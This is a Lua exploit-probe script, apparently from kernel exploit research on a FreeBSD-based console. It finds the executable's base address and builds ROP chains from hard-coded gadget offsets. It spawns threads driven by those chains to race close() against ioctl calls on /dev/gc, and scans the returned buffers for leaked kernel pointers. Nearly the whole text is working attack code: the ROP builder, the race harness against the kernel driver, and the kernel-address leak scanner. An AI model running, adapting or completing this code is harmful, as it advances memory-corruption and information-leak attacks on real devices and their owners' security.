-- CRASH_CLASS: MODERATE
-- PROBE 96a: /dev/gc ioctl vs close() cross-thread race
--
-- Race: child thread calls close(gc_fd) while main thread is in ioctl handler.
-- Uses confirmed 384b child thread pattern (thr_new with ROP chain).
-- Protected by setitimer watchdog.

print("=== PROBE 96a: GC IOCTL CLOSE RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. tostring(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42

-- Install SIGALRM handler + ignore SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), g_bare_ret); wd(N(sa)+8, 0); wq(N(sa)+16, uint64(0))
pcall(function() mk(416)(uint64(14), sa, uint64(0)) end)
wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local function arm_wd(s)
    local itv = memory.alloc(64)
    wq(N(itv), uint64(0)); wq(N(itv)+8, uint64(0))
    wq(N(itv)+16, uint64(s)); wq(N(itv)+24, uint64(0))
    pcall(function() mk(83)(uint64(0), itv, uint64(0)) end)
end
local function disarm_wd()
    local itv = memory.alloc(64)
    for j = 0, 60, 4 do wd(N(itv)+j, 0) end
    pcall(function() mk(83)(uint64(0), itv, uint64(0)) end)
end

local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Spawn a child that: SET_FSBASE -> nanosleep(delay_ns) -> close(fd) -> thr_exit
-- Uses 384b pattern: start_func=g_bare_ret, arg=fd, chain on stack
local function spawn_closer(fd_to_close, delay_ns)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local ss = 0x2000
    local rsp = sb + ss - ((sb + ss) % 16) - 8

    -- Fake TCB for SET_FSBASE
    local tcb = memory.alloc(0x1000)
    wq(N(tcb), uint64(N(tcb)))
    local fsb = memory.alloc(8)
    wq(N(fsb), uint64(N(tcb)))

    -- Timespec
    local ts = memory.alloc(16)
    wq(N(ts), uint64(0))
    wq(N(ts)+8, uint64(delay_ns))

    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    -- sysarch(165, rdi=129, rsi=&fsb)
    -- Entry: start_func=g_bare_ret just does ret, so RSP[0] is the first gadget
    emit(g_pop_rdi);    emit(uint64(129))
    emit(g_pop_rsi);    emit(uint64(N(fsb)))
    emit(g_pop_rax);    emit(uint64(165))
    emit(stub)

    -- nanosleep(240, rdi=&ts, rsi=0)
    emit(g_pop_rdi);    emit(uint64(N(ts)))
    emit(g_pop_rsi);    emit(uint64(0))
    emit(g_pop_rax);    emit(uint64(240))
    emit(stub)

    -- close(6, rdi=fd)
    emit(g_pop_rdi);    emit(uint64(fd_to_close))
    emit(g_pop_rax);    emit(uint64(6))
    emit(stub)

    -- thr_exit(431, rdi=0)
    emit(g_pop_rdi);    emit(uint64(0))
    emit(g_pop_rax);    emit(uint64(431))
    emit(stub)

    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa+i, 0) end
    wq(pa, g_bare_ret)           -- start_func
    wq(pa+8, uint64(fd_to_close)) -- arg (goes to rdi, but we override it)
    wq(pa+0x10, uint64(sb))      -- stack_base
    wq(pa+0x18, uint64(ss))      -- stack_size
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(pa+0x30, tid)

    local ok_t, rv_t = pcall(function()
        return mk(455)(uint64(pa), uint64(0x38))
    end)
    return ok_t and N(rv_t) == 0
end

local function open_gc()
    local path = memory.alloc(16)
    wd(N(path), 0x7665642F)    -- /dev
    wd(N(path)+4, 0x0063672F)  -- /gc\0
    local ok_o, rv_o = pcall(function()
        return mk(5)(uint64(N(path)), uint64(2), uint64(0))
    end)
    local fd = ok_o and N(rv_o) or -1
    if fd >= 0x80000000 then fd = fd - 0x100000000 end
    return fd
end

local function nsleep_ms(ms)
    local ts = memory.alloc(16)
    wq(N(ts), uint64(0))
    wq(N(ts)+8, uint64(ms * 1000000))
    pcall(function() mk(240)(uint64(N(ts)), uint64(0)) end)
end

-- ====== Sanity: verify child close works ======
print("--- Sanity: child close test ---")
do
    local ok_s, rv_s = pcall(function()
        return mk(97)(uint64(2), uint64(2), uint64(0))
    end)
    local test_fd = ok_s and N(rv_s) or -1
    if test_fd < 0 then print("socket failed"); return end

    local spawned = spawn_closer(test_fd, 10000000)  -- 10ms
    nsleep_ms(100)

    -- Try to close it ourselves - should fail if child got it
    local ok_c, rv_c = pcall(function() return mk(6)(uint64(test_fd)) end)
    local cl = ok_c and N(rv_c) or -999
    if cl >= 0x80000000 then cl = cl - 0x100000000 end
    if cl == -1 then
        print("child close CONFIRMED (our close returned -1)")
    else
        print("child close: our close returned " .. cl)
    end
end

if not alive() then print("DEAD"); return end

-- ====== TEST A: close() vs blocking ioctl 0xC0048125 ======
print("")
print("--- A: close vs blocking ioctl 0xC0048125 ---")
for round = 1, 3 do
    local gc_fd = open_gc()
    if gc_fd < 0 then print("R" .. round .. ": open failed"); break end

    -- Child closes after 200ms
    spawn_closer(gc_fd, 200000000)

    local iobuf = memory.alloc(16)
    for j = 0, 12, 4 do wd(N(iobuf)+j, 0xAAAAAAAA) end

    arm_wd(3)
    local t1 = os.clock()
    local ok_i, rv_i = pcall(function()
        return mk(54)(uint64(gc_fd), uint64(0xC0048125), uint64(N(iobuf)))
    end)
    local t2 = os.clock()
    disarm_wd()

    local i_ret = ok_i and N(rv_i) or -999
    if i_ret >= 0x80000000 then i_ret = i_ret - 0x100000000 end
    local out0 = rd(N(iobuf)) or 0
    if out0 < 0 then out0 = out0 + 0x100000000 end

    print(string.format("R%d: ret=%d t=%.2fs out=0x%08X", round, i_ret, t2-t1, out0))

    if t2 - t1 >= 2 then
        pcall(function() mk(6)(uint64(gc_fd)) end)
    end
    nsleep_ms(300)
    if not alive() then print("DEAD after R" .. round); return end
end

-- ====== TEST B: rapid close vs fast data ioctls ======
print("")
print("--- B: close vs fast ioctls ---")

local fast_cmds = {
    {0xC008811B, 8},
    {0xC0048113, 4},
    {0x40048135, 4},
    {0xC0488131, 0x48},
    {0xC0188132, 0x18},
}

for ci, spec in ipairs(fast_cmds) do
    local cmd = spec[1]
    local sz = spec[2]
    local kptrs = 0

    for round = 1, 50 do
        local gc_fd = open_gc()
        if gc_fd < 0 then break end

        -- Child closes immediately (1ms)
        spawn_closer(gc_fd, 1000000)

        local iobuf = memory.alloc(0x50)
        for j = 0, 0x4C, 4 do wd(N(iobuf)+j, 0xAAAAAAAA) end

        for rep = 1, 5 do
            local ok_i, rv_i = pcall(function()
                return mk(54)(uint64(gc_fd), uint64(cmd), uint64(N(iobuf)))
            end)

            for j = 0, sz-4, 4 do
                local lo = rd(N(iobuf)+j) or 0
                local hi = rd(N(iobuf)+j+4) or 0
                if lo < 0 then lo = lo + 0x100000000 end
                if hi < 0 then hi = hi + 0x100000000 end
                if hi >= 0xFFFF8000 and hi < 0xFFFFFF00 then
                    print(string.format("  CMD%08X R%d.%d KPTR+%02X: 0x%08X%08X",
                        cmd, round, rep, j, hi, lo))
                    kptrs = kptrs + 1
                end
            end
        end
        nsleep_ms(10)
        if not alive() then print("DEAD at cmd " .. string.format("%08X", cmd)); return end
    end
    print(string.format("CMD 0x%08X: kptrs=%d", cmd, kptrs))
end

print("")
print("alive=" .. tostring(alive()))
print("=== 96a COMPLETE ===")
